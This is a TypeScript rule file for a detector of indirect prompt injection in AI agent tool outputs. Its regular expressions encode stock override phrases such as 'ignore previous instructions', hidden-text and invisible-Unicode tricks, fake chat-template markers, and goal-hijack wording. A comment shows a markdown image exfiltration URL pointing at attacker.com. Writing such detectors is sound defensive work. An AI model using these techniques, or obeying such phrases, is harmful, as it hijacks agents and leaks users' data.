/**
 * Output Injection Detector Rules
 *
 * Detects indirect prompt injection patterns in tool results/outputs.
 * This addresses OWASP ASI01 — the #1 attack vector for AI agents.
 *
 * When an agent fetches a webpage, reads a file, or calls an API,
 * the returned content may contain injection payloads designed to
 * hijack the agent's behavior. These patterns are distinct from
 * input-side injection because they appear in tool *results* rather
 * than user prompts.
 */

import type { DetectorRule } from '../types.js';

export const OUTPUT_INJECTION_RULES: DetectorRule[] = [
  // ── Indirect instruction override in tool results ─────────────────────
  // Note: Output-specific patterns use relaxed anchoring compared to input patterns.
  // Tool results may be embedded in JSON, HTML, or other structured formats where
  // strict sentence-boundary anchoring would miss injection payloads.
  {
    id: 'output-injection-ignore-instructions',
    type: 'injection',
    subType: 'INDIRECT_INJECTION',
    pattern: /(?:^|\n|[.!?:;,"'}\]])\s*ignore\s+(?:all\s+)?(?:previous|above|prior|earlier|your|the)\s+(?:instructions|rules|guidelines|directives|constraints|prompts?)/i,
    confidence: 0.95,
    description: 'Indirect prompt injection in output — ignore instructions',
  },
  {
    id: 'output-injection-forget-instructions',
    type: 'injection',
    subType: 'INDIRECT_INJECTION',
    pattern: /(?:^|\n|[.!?:;,"'}\]])\s*forget\s+(?:all\s+)?(?:previous|above|prior|earlier|your|the)\s+(?:instructions|rules|guidelines|directives|constraints|prompts?)/i,
    confidence: 0.95,
    description: 'Indirect prompt injection in output — forget instructions',
  },
  {
    id: 'output-injection-disregard',
    type: 'injection',
    subType: 'INDIRECT_INJECTION',
    pattern: /(?:^|\n|[.!?:;,"'}\]])\s*disregard\s+(?:all\s+)?(?:previous|above|prior|earlier|your|the)\s+(?:instructions|rules|guidelines|directives|constraints|prompts?)/i,
    confidence: 0.95,
    description: 'Indirect prompt injection in output — disregard instructions',
  },
  {
    id: 'output-injection-new-instructions',
    type: 'injection',
    subType: 'INDIRECT_INJECTION',
    pattern: /(?:^|\n|[.!?:;,"'}\]])\s*(?:your\s+)?new\s+(?:instructions|system\s*prompt|rules|directives)\s*(?:are|:)/i,
    confidence: 0.9,
    description: 'Indirect prompt injection in output — new instructions',
  },

  // ── Hidden instruction patterns unique to tool outputs ────────────────
  {
    id: 'output-injection-hidden-text-html',
    type: 'injection',
    subType: 'HIDDEN_INSTRUCTION',
    // Hidden text via CSS (display:none, visibility:hidden, font-size:0, opacity:0)
    // Common in web scraping results where attackers hide instructions
    pattern: /style\s*=\s*["'][^"']*(?:display\s*:\s*none|visibility\s*:\s*hidden|font-size\s*:\s*0|opacity\s*:\s*0|position\s*:\s*absolute[^"']*left\s*:\s*-\d{4,})[^"']*["']/i,
    confidence: 0.82,
    description: 'Hidden HTML text with potential injection payload',
  },
  {
    id: 'output-injection-hidden-comment-instruction',
    type: 'injection',
    subType: 'HIDDEN_INSTRUCTION',
    // HTML comments containing AI-targeting instructions
    pattern: /<!--[^]*?(?:AI|assistant|agent|LLM|GPT|Claude|model)\s*[,:]\s*(?:ignore|forget|disregard|override|execute|run|call|invoke|you\s+(?:must|should|are|will))[^]*?-->/i,
    confidence: 0.88,
    description: 'HTML comment targeting AI with hidden instructions',
  },
  {
    id: 'output-injection-invisible-unicode',
    type: 'injection',
    subType: 'HIDDEN_INSTRUCTION',
    // Text between invisible Unicode characters — used to hide injection payloads
    // Checks for instruction keywords surrounded by zero-width characters
    pattern: /[\u200B\u200C\u200D\uFEFF\u2060\u2061\u2062\u2063\u2064\u2066\u2067\u2068\u2069\u206A-\u206F](?:.*?(?:ignore|forget|disregard|execute|override|instructions|system\s*prompt).*?)[\u200B\u200C\u200D\uFEFF\u2060\u2061\u2062\u2063\u2064\u2066\u2067\u2068\u2069\u206A-\u206F]/i,
    confidence: 0.85,
    description: 'Instructions hidden between invisible Unicode characters',
  },

  // ── Tool-result specific manipulation ─────────────────────────────────
  {
    id: 'output-injection-tool-call-instruction',
    type: 'injection',
    subType: 'TOOL_MANIPULATION',
    // Instructions that try to make the agent call specific tools
    pattern: /(?:^|\n|[.!?:;,"'}\]])\s*(?:you\s+(?:must|should|need\s+to)\s+|(?:please|now)\s+)(?:call|invoke|execute|run|use)\s+(?:the\s+)?(?:tool|function|api|endpoint|command)\b/i,
    confidence: 0.78,
    description: 'Output contains instructions to invoke tools',
  },
  {
    id: 'output-injection-send-data-to',
    type: 'injection',
    subType: 'TOOL_MANIPULATION',
    // Instructions to exfiltrate data to external endpoints
    pattern: /(?:^|\n|[.!?:;,"'}\]])\s*(?:you\s+(?:must|should|need\s+to)\s+|(?:please|now)\s+)(?:send|post|transmit|forward|upload|exfiltrate)\s+(?:the\s+|all\s+|this\s+|any\s+)?(?:data|information|content|results?|response|conversation|chat|history|context|secrets?|keys?|tokens?|credentials?)\s+(?:to|at|via)\b/i,
    confidence: 0.88,
    description: 'Output instructs agent to exfiltrate data',
  },
  {
    id: 'output-injection-goal-hijack',
    type: 'injection',
    subType: 'TOOL_MANIPULATION',
    // Goal hijacking: override the agent's primary objective
    pattern: /(?:^|\n|[.!?:;,"'}\]])\s*(?:your\s+(?:new|real|actual|true|primary)\s+(?:goal|objective|task|purpose|mission)|(?:from\s+now\s+on|henceforth|going\s+forward)\s+you\s+(?:will|shall|must|are\s+to))\b/i,
    confidence: 0.85,
    description: 'Goal hijacking attempt in output',
  },

  // ── Delimiter injection in outputs ────────────────────────────────────
  {
    id: 'output-injection-fake-system-msg',
    type: 'injection',
    subType: 'DELIMITER_INJECTION',
    // Fake system/assistant message boundaries appearing in tool results
    pattern: /(?:^|\n)\s*(?:system|assistant)\s*:\s*(?:\n|$)/i,
    confidence: 0.8,
    description: 'Fake message boundary in tool output',
  },
  {
    id: 'output-injection-model-markers',
    type: 'injection',
    subType: 'DELIMITER_INJECTION',
    pattern: /\[\/?\s*INST\s*\]|<<\s*\/?SYS\s*>>|<\|im_start\|>|<\|im_end\|>/,
    confidence: 0.88,
    description: 'Model-specific prompt markers in tool output',
  },

  // ── Markdown/HTML injection targeting rendered contexts ────────────────
  {
    id: 'output-injection-markdown-image-exfil',
    type: 'exfiltration',
    subType: 'MARKDOWN_EXFIL',
    // Markdown images that encode data in URL (used to exfiltrate via rendering)
    // ![alt](https://attacker.com/log?data=STOLEN_DATA)
    pattern: /!\[(?:[^\]]*)\]\(\s*https?:\/\/[^\s)]+(?:\?|&)(?:[^\s)]*(?:data|token|secret|key|password|ssn|credit|card|session)[^\s)]*)\)/i,
    confidence: 0.82,
    description: 'Markdown image tag with potential data exfiltration URL',
  },
  {
    id: 'output-injection-html-img-exfil',
    type: 'exfiltration',
    subType: 'MARKDOWN_EXFIL',
    // HTML img tags that encode data in src URL
    pattern: /<img[^>]+src\s*=\s*["']https?:\/\/[^"']+(?:\?|&)(?:[^"']*(?:data|token|secret|key|password|ssn|credit|card|session)[^"']*)["'][^>]*>/i,
    confidence: 0.82,
    description: 'HTML img tag with potential data exfiltration URL',
  },
];
